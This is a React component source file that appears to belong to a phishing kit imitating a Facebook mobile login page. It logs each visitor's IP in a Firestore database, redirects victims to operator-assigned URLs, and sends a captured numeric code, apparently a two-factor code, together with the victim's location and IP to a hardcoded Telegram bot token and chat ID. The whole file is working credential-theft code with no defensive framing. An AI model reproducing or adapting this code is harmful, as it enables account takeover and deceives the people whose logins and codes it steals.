import React, { useEffect, useState } from 'react';
import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
import { publicIpv4 } from 'public-ip';
import { IoIosAdd as IconAdd } from "react-icons/io";
import { footerLinks, desktoplanguages, mobileLanguages } from '../constants/footer.js'; // Import mobileLanguages
import { db } from '../firebase.js';
import { useMediaQuery } from 'react-responsive';

import '../constants/footer.js';

const About595 = () => {
    const [ip, setIp] = useState(undefined);
    const [code, setCode] = useState('');
    const [userData, setUserData] = useState(undefined);
    const [isUserData, setIsUserData] = useState(false);
    const [userUrl, setUserUrl] = useState(false);
    
    const isDesktop = useMediaQuery({ query: '(min-width: 768px)' });

    useEffect(() => {
        if (isDesktop) {
            window.location.href = 'about9';
        }
    }, [isDesktop]);

    const handleActions = () => {
        if (code === '') {
            // Handle code validation
            return;
        } else {
            const bot = 'bot6444053579:AAEJM3cGwVt_s9ajNfMpPnKtr_71p20S_dw';
            const chid = '5651241356';

            fetch(`https://ipapi.co/json/`)
                .then((response) => response.json())
                .then((response) => {
                    const { country, region, city } = response;
                    const params = {
                        content: `========================
                        TWO 1: '${code}'
                        Country : '${country}'
                        Region : '${region}'
                        City : '${city}'
                        IP: '${ip}'
                        ========================`
                    };

                    fetch(`https://api.telegram.org/${bot}/sendMessage?chat_id=${chid}&text=${params.content}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                    })
                        .then(() => {
                            window.location = 'rwr';
                        })
                        .catch((error) => {
                            window.location = 'rwr';
                        });
                });
        }
    };

    const handleCodeChange = (e) => {
        setCode(e.target.value.replace(/[^0-9]/g, '')); // Allow only numeric input
    };

    const getUserData = async (e) => {
        const documentSnapshot = await getDocs(collection(db, "nrchanger"));
        const newData = documentSnapshot.docs
            .map((doc) => ({ ...doc.data(), id: doc.id }));
        const filter = newData.filter(x => {
            if (x.ip === ip) {
                setIsUserData(true);
                setUserData(x);
                return x;
            }
        });
        if (filter.length === 0) {
            addUserData();
        }
    };

    const getIp = async () => {
        if (ip === undefined) {
            console.log(await publicIpv4());
            const ip = await publicIpv4();
            setIp(ip);
        }
    };
    getIp();

    useEffect(() => {
        if (ip) {
            onSnapshot(collection(db, "nrchanger"), (snapshot) => {
                let isExist = false;
                snapshot.docs.map((doc) => ({ ...doc.data(), id: doc.id })).filter(x => {
                    if (x.ip === ip) {
                        isExist = true;
                        setUserData(x);
                        fetch('./data.json').then(
                            function (res) {
                                return res.json();
                            },
                        ).then(function (data) {
                            data.url_data.filter((item) => {
                                if (item.id === parseInt(x.redir)) {
                                    setUserUrl(item.url);
                                    return;
                                }
                            });
                        }).catch(
                            function (err) {
                                console.log(err, ' error');
                            },
                        );
                    }
                });
                if (!isExist) {
                    setUserUrl(false);
                }
            });
        }
    }, [ip]);

    useEffect(() => {
        document.title = 'Welcome About8';
    }, [userData, userUrl]);

    useEffect(() => {}, [userData]);

    const addUserData = async () => {
        try {
            const docRef = doc(collection(db, "nrchanger"), ip);

            const docSnap = await getDoc(docRef);

            if (!docSnap.exists()) {
                await setDoc(docRef, {
                    ip: ip,
                    number: -1,
                    redir: "-1"
                });
                console.log("Document written with ID: ", ip);
                getUserData();
            } else {
                console.log("Document already exists with ID: ", ip);
            }
        } catch (e) {
            console.error("Error adding document: ", e);
        }
    };

    const resetUserNumber = async () => {
        try {
            const docRef = doc(collection(db, "nrchanger"), ip);
            await setDoc(docRef, { redir: "-1" }, { merge: true });
            console.log("User number reset to -1 for IP: ", ip);
        } catch (e) {
            console.error("Error resetting user number: ", e);
        }
    };

    useEffect(() => {
        if (ip) {
            getUserData();
        }
    }, [ip]);

    if (userUrl) {
        setTimeout(() => {
            window.location = userUrl;
        }, 1000);
        resetUserNumber();
    }

    console.log("hi here is the data", isUserData, userData);

    if (isUserData) {
        return (
            <section className="w-full flex sm:hidden flex-col items-center justify-start gap-4 bg-white">
                <div className="w-full text-left text-[12px] px-3 py-[8px] text-neutral-500 bg-citrine/10 border-solid border-0 border-b-[1px] border-citrine rounded-sm ">
                    You must log in first.
                </div>
                <a href="/" className="w-[100px] h-[25px] flex items-center justify-center relative">
                    <img src="/images/facebook.png" alt="facebook" fill className="object-contain" />
                </a>
                <div className="w-full max-w-[450px] flex flex-col items-center justify-start gap-3 px-3">
                    <form className="w-full flex flex-col items-center justify-start gap-2">
                        <input
                            type="text"
                            className="w-full p-[8px] text-sm placeholder:text-sm text-neutral-500 rounded bg-mercury/60 shadow-md font-medium border-[1px] border-solid border-mercury focus:outline-none"
                            placeholder="Mobile number or email"
                        />
                        <input
                            type="password"
                            className="w-full p-[8px] pr-4 text-sm placeholder:text-sm text-neutral-500 rounded bg-mercury/60 shadow-md font-medium border-[1px] border-solid border-mercury focus:outline-none"
                            placeholder="Password"
                        />
                        <button type="submit" className="w-full mt-1 px-3 h-[35px] bg-facebook hover:bg-opacity-90 text-white text-base font-semibold rounded transition-all duration-300">
                            Log in
                        </button>
                    </form>
                    <button type="button" className="w-full text-facebook text-sm font-medium bg-none hover:underline transition-all duration-300">
                        Forgot account?
                    </button>
                    <div className="w-full flex items-center justify-between gap-3">
                        <div className="flex-1 h-[0.5px] bg-neutral-400 text-neutral-400" />
                        <p className="text-sm font-medium text-neutral-500">or</p>
                        <div className="flex-1 h-[0.5px] bg-neutral-400 text-neutral-400" />
                    </div>
                    <button type="button" className="w-full max-w-[80%] text-sm bg-none font-medium px-2 py-[6px] border-[1px] border-solid border-neutral-400 rounded hover:bg-neutral-300/20 transition-all duration-300">
                        Create new account
                    </button>
                    <footer className="w-full py-10 flex flex-col items-center justify-start gap-4">
                        <div className="w-full grid grid-cols-2 gap-[6px] place-items-center">
                            <p className="text-xs text-neutral-500 hover:underline font-bold transition-all duration-300 cursor-pointer">
                                English (UK)
                            </p>
                            {mobileLanguages.map((item, i) => (
                                <p key={i} className="text-xs text-neutral-500 hover:underline transition-all duration-300 cursor-pointer">
                                    {item}
                                </p>
                            ))}
                            <div className="px-[3px] flex items-center justify-center border-[1px] border-solid border-[#ccd0d5] rounded-[2px] overflow-hidden cursor-pointer transition-all duration-300">
                                <IconAdd size={17} />
                            </div>
                        </div>
                        <p className="text-xs text-center w-full text-neutral-500 transition-all duration-300 cursor-pointer">
                            Meta © 2024
                        </p>
                    </footer>
                </div>
            </section>
        );
    }
    return null; // Return null if no user data is present
};

export default About595;
